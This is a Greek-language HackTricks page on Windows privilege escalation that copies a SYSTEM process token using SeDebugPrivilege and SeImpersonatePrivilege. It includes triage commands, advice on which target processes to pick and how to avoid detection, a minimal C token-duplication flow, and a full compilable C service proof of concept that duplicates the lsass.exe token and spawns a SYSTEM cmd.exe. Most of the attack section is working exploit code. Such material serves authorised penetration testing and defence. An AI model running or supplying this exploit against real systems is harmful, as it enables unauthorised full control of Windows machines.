# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα καλύπτει την παραλλαγή **manual token-theft**, όπου ένα context **High Integrity** που διαθέτει ήδη τα **`SeDebugPrivilege`** και **`SeImpersonatePrivilege`** ανοίγει μια κατάλληλη διεργασία **SYSTEM**, αντιγράφει το token της και εκκινεί μια νέα διεργασία με αυτό το token.

Αν χρειάζεστε μόνο ένα γρήγορο shell **SYSTEM** από μια privileged διεργασία διαχειριστή, δείτε επίσης:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Αν δεν διαθέτετε process-handle path αλλά έχετε **`SeImpersonatePrivilege`**, η διαδρομή **named-pipe / Potato** είναι συνήθως ευκολότερη:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Γρήγορο triage

Πριν επιχειρήσετε το token-copy path, επιβεβαιώστε ότι η τρέχουσα διεργασία βρίσκεται ήδη σε χρήσιμο context:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Σημειώσεις:

- Το **`SeDebugPrivilege`** είναι αυτό που σας επιτρέπει να ανοίγετε πολλές **μη προστατευμένες** διεργασίες SYSTEM, ακόμη και όταν το DACL τους κανονικά θα σας απέκλειε.
- Το **`SeImpersonatePrivilege`** είναι αυτό που κάνει το **`CreateProcessWithTokenW`** πρακτικά χρήσιμο στη συνέχεια.
- Αν η διαδρομή αντιγραφής token σάς δίνει μόνο ένα αδύναμο ή φιλτραρισμένο SYSTEM token, απλώς κλέψτε token από **διαφορετική διεργασία SYSTEM**.

## Επιλέξτε προσεκτικά τη διεργασία-στόχο

Η τεχνική συνήθως παρουσιάζεται με στόχο το **`lsass.exe`**, αλλά στα σύγχρονα Windows αυτό συχνά είναι ο **λάθος στόχος**:

- Αν είναι ενεργοποιημένο το **LSA Protection / RunAsPPL**, το **`lsass.exe`** είναι προστατευμένο και μια κανονική διεργασία διαχειριστή με **`SeDebugPrivilege`** και πάλι δεν θα μπορεί να το ανοίξει.<sup>[[2]](#references)</sup>
- Προτιμήστε **μη-PPL διεργασίες SYSTEM**, όπως τις **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ή μια πρώιμη παρουσία του **`svchost.exe`**.
- Οι **προστατευμένες διεργασίες** και ορισμένες ειδικές διεργασίες, όπως οι **`System`** ή **`csrss.exe`**, δεν αποτελούν ρεαλιστικούς στόχους user-mode για αυτήν την τεχνική.
- Χρησιμοποιήστε το **Process Hacker / Process Explorer** με elevated δικαιώματα, για να επαληθεύσετε ότι το token-στόχος διαθέτει πράγματι τα privileges που θέλετε, πριν το αντιγράψετε.

## Λεπτομέρειες API που έχουν σημασία στην πράξη

Πολλά δημόσια PoCs ζητούν **`PROCESS_ALL_ACCESS`** και **`TOKEN_ALL_ACCESS`**, αλλά αυτό είναι πιο θορυβώδες από όσο χρειάζεται. Στην πράξη:

- Ανοίξτε τη διεργασία-στόχο μόνο με τα δικαιώματα που χρειάζεστε (συνήθως **`PROCESS_QUERY_INFORMATION`** ή **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Ανοίξτε το token με τα δικαιώματα που απαιτούνται για τη δημιουργία διεργασίας: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Χρησιμοποιήστε το **`DuplicateTokenEx(..., TokenPrimary, ...)`** για να δημιουργήσετε ένα **primary token**· ένα impersonation token από μόνο του δεν αρκεί για τη δημιουργία νέας διεργασίας.
- Αν το **`CreateProcessWithTokenW`** αποτύχει με **`1314`**, χρησιμοποιήστε το **`CreateProcessAsUserW`**.
- Αν εκκινείτε από ένα **service / Session 0**, θυμηθείτε ότι το **`CreateProcessWithTokenW`** διατηρεί το child στη **session του caller**. Αν χρειάζεστε ένα ορατό desktop shell, χρησιμοποιήστε το **`CreateProcessAsUserW`** και μετακινήστε το token στην επιθυμητή session.<sup>[[1]](#references)</sup>

Μια ελάχιστη σύγχρονη ροή μοιάζει ως εξής:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Πλήρες service PoC

Ο ακόλουθος κώδικας **εκμεταλλεύεται τα δικαιώματα `SeDebugPrivilege` και `SeImpersonatePrivilege`** για να αντιγράψει το token από μια **διεργασία που εκτελείται ως SYSTEM** και διαθέτει **όλα τα προνόμια του token**. Σε αυτήν την περίπτωση, ο κώδικας μπορεί να γίνει compile και να χρησιμοποιηθεί ως **δυαδικό αρχείο Windows service** για να επαληθευτεί ότι το primitive λειτουργεί.<sup>[[3]](#references)</sup>

Το κύριο μέρος του **κώδικα όπου πραγματοποιείται η ανύψωση** βρίσκεται μέσα στη συνάρτηση **`Exploit`**. Μέσα σε αυτήν τη συνάρτηση μπορείτε να δείτε ότι γίνεται αναζήτηση του **`lsass.exe`**, αντιγράφεται το **token** του και, τέλος, αυτό το token χρησιμοποιείται για την εκκίνηση ενός νέου **`cmd.exe`** με όλα τα προνόμια του αντιγραμμένου token.

Σε σύγχρονα hosts, συχνά θα θέλετε να αντικαταστήσετε το **`lsass.exe`** με μια άλλη **non-PPL διεργασία SYSTEM**, όπως οι **`winlogon.exe`**, **`wininit.exe`** ή **`services.exe`**.

Άλλες διεργασίες που εκτελούνται ως SYSTEM με όλα ή τα περισσότερα προνόμια του token είναι οι: **`services.exe`**, **`svchost.exe`** (ορισμένες από τις πρώτες), **`wininit.exe`**, **`csrss.exe`**... Να θυμάστε ότι γενικά **δεν θα μπορείτε να αντιγράψετε token από μια protected process**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Αναφορές

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Running my program as a service (cboard.cprogramming.com) – Windows service skeleton used by the PoC](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
